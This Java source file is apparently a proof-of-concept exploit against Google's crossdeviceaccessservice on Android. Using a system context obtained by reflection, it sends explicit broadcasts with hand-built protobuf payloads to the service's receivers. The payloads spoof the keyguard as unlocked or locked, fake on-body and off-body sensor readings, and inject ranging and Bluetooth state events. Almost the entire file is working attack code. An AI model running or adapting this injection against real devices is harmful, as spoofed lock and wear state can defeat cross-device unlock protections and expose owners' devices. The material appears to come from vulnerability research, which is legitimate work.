import android.content.ComponentName;
import android.content.Intent;
import android.content.Context;
import android.os.Looper;
import java.io.ByteArrayOutputStream;

/**
 * PoC: Inject fake data into CrossDeviceAccessService receivers
 * using EXPLICIT component targeting to bypass background execution limits.
 */
public class CDUInject2 {

    public static void main(String[] args) throws Exception {
        System.out.println("=== CDU Explicit Broadcast Injection PoC ===");
        System.out.println("UID: " + android.os.Process.myUid());

        Looper.prepareMainLooper();
        Class<?> atClass = Class.forName("android.app.ActivityThread");
        Object at = atClass.getMethod("systemMain").invoke(null);
        Context ctx = (Context) atClass.getMethod("getSystemContext").invoke(at);

        String targetPkg = "com.google.android.crossdeviceaccessservice";

        // Test 1: Keyguard injection (explicit broadcast)
        System.out.println("\n--- Test 1: EXPLICIT keyguard unlock injection ---");
        try {
            byte[] keyguardPayload = buildKeyguardProto(false); // unlocked
            Intent intent = new Intent("com.google.android.wearable.pixel.pdms.crossdeviceaccessservice.intent.action.ACTION_KEYGUARD_STATE_CHANGED_EVENT");
            intent.setComponent(new ComponentName(targetPkg,
                "com.google.android.crossdeviceaccessservice.associated.shared.data.infrastructure.KeyguardEventReceiver"));
            intent.putExtra("crossdeviceaccessservice.keyguard_event_data", keyguardPayload);
            ctx.sendBroadcast(intent);
            System.out.println("  SENT: isKeyguardLocked=false (" + keyguardPayload.length + " bytes)");
            System.out.println("  Payload: " + bytesToHex(keyguardPayload));
        } catch (Exception e) {
            System.out.println("  ERROR: " + e.getMessage());
        }

        Thread.sleep(500);

        // Test 2: On-body sensor injection (explicit broadcast)
        System.out.println("\n--- Test 2: EXPLICIT on-body sensor injection ---");
        try {
            byte[] sensorPayload = buildSensorProto(34, 3, 1.0f); // offbody detect, high accuracy, on-body
            Intent intent = new Intent("com.google.android.wearable.pixel.pdms.crossdeviceaccessservice.intent.action.ACTION_SENSOR_EVENT");
            intent.setComponent(new ComponentName(targetPkg,
                "com.google.android.crossdeviceaccessservice.associated.shared.data.infrastructure.SensorEventReceiver"));
            intent.putExtra("crossdeviceaccessservice.sensor_event_data", sensorPayload);
            ctx.sendBroadcast(intent);
            System.out.println("  SENT: LOW_LATENCY_OFFBODY_DETECT, value=1.0 (" + sensorPayload.length + " bytes)");
            System.out.println("  Payload: " + bytesToHex(sensorPayload));
        } catch (Exception e) {
            System.out.println("  ERROR: " + e.getMessage());
        }

        Thread.sleep(500);

        // Test 3: Keyguard locked injection
        System.out.println("\n--- Test 3: EXPLICIT keyguard locked injection ---");
        try {
            byte[] keyguardPayload = buildKeyguardProto(true); // locked
            Intent intent = new Intent("com.google.android.wearable.pixel.pdms.crossdeviceaccessservice.intent.action.ACTION_KEYGUARD_STATE_CHANGED_EVENT");
            intent.setComponent(new ComponentName(targetPkg,
                "com.google.android.crossdeviceaccessservice.associated.shared.data.infrastructure.KeyguardEventReceiver"));
            intent.putExtra("crossdeviceaccessservice.keyguard_event_data", keyguardPayload);
            ctx.sendBroadcast(intent);
            System.out.println("  SENT: isKeyguardLocked=true (" + keyguardPayload.length + " bytes)");
        } catch (Exception e) {
            System.out.println("  ERROR: " + e.getMessage());
        }

        Thread.sleep(500);

        // Test 4: Ranging capabilities injection
        System.out.println("\n--- Test 4: EXPLICIT ranging capabilities injection ---");
        try {
            Intent intent = new Intent("com.google.android.wearable.pixel.pdms.crossdeviceaccessservice.intent.action.ACTION_RANGING_CAPABILITIES_EVENT");
            intent.setComponent(new ComponentName(targetPkg,
                "com.google.android.crossdeviceaccessservice.associated.shared.data.infrastructure.RangingCapabilitiesEventReceiver"));
            intent.putExtra("crossdeviceaccessservice.ranging_capabilities_data", new byte[]{0x08, 0x01});
            ctx.sendBroadcast(intent);
            System.out.println("  SENT: Ranging capabilities (2 bytes)");
        } catch (Exception e) {
            System.out.println("  ERROR: " + e.getMessage());
        }

        Thread.sleep(500);

        // Test 5: Bluetooth state change injection
        System.out.println("\n--- Test 5: EXPLICIT fake state change injection ---");
        try {
            Intent intent = new Intent("com.google.android.pixelsystemservice.crossdeviceaccessservice.intent.action.ACTION_STATE_CHANGED");
            intent.setComponent(new ComponentName(targetPkg,
                "com.google.android.crossdeviceaccessservice.associated.core.intent.bluetooth.BluetoothBroadcastReceiver"));
            ctx.sendBroadcast(intent);
            System.out.println("  SENT: Fake state change");
        } catch (Exception e) {
            System.out.println("  ERROR: " + e.getMessage());
        }

        Thread.sleep(500);

        // Test 6: Off-body injection (to prove we can toggle body state)
        System.out.println("\n--- Test 6: EXPLICIT off-body sensor injection ---");
        try {
            byte[] sensorPayload = buildSensorProto(34, 3, 0.0f); // offbody detect, high accuracy, OFF-body
            Intent intent = new Intent("com.google.android.wearable.pixel.pdms.crossdeviceaccessservice.intent.action.ACTION_SENSOR_EVENT");
            intent.setComponent(new ComponentName(targetPkg,
                "com.google.android.crossdeviceaccessservice.associated.shared.data.infrastructure.SensorEventReceiver"));
            intent.putExtra("crossdeviceaccessservice.sensor_event_data", sensorPayload);
            ctx.sendBroadcast(intent);
            System.out.println("  SENT: LOW_LATENCY_OFFBODY_DETECT, value=0.0 (off-body)");
        } catch (Exception e) {
            System.out.println("  ERROR: " + e.getMessage());
        }

        Thread.sleep(200);
        System.out.println("\n=== Done. Check logcat for processing evidence. ===");
    }

    static byte[] buildKeyguardProto(boolean locked) throws Exception {
        ByteArrayOutputStream proto = new ByteArrayOutputStream();
        proto.write(0x08); // field 1 tag
        proto.write(locked ? 0x01 : 0x00);
        long nowSeconds = System.currentTimeMillis() / 1000;
        byte[] ts = buildTimestamp(nowSeconds);
        proto.write(0x12); // field 2 tag
        writeVarint(proto, ts.length);
        proto.write(ts);
        return proto.toByteArray();
    }

    static byte[] buildSensorProto(int sensorType, int accuracy, float value) throws Exception {
        ByteArrayOutputStream proto = new ByteArrayOutputStream();
        proto.write(0x08);
        writeVarint(proto, sensorType);
        long nowSeconds = System.currentTimeMillis() / 1000;
        byte[] ts = buildTimestamp(nowSeconds);
        proto.write(0x12);
        writeVarint(proto, ts.length);
        proto.write(ts);
        proto.write(0x18);
        writeVarint(proto, accuracy);
        int bits = Float.floatToIntBits(value);
        proto.write(0x22);
        proto.write(0x04);
        proto.write(bits & 0xFF);
        proto.write((bits >> 8) & 0xFF);
        proto.write((bits >> 16) & 0xFF);
        proto.write((bits >> 24) & 0xFF);
        return proto.toByteArray();
    }

    static byte[] buildTimestamp(long seconds) throws Exception {
        ByteArrayOutputStream ts = new ByteArrayOutputStream();
        ts.write(0x08);
        writeVarint(ts, seconds);
        return ts.toByteArray();
    }

    static void writeVarint(ByteArrayOutputStream out, long value) {
        while ((value & ~0x7FL) != 0) {
            out.write((int) ((value & 0x7F) | 0x80));
            value >>>= 7;
        }
        out.write((int) (value & 0x7F));
    }

    static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) sb.append(String.format("%02x", b & 0xff));
        return sb.toString();
    }
}
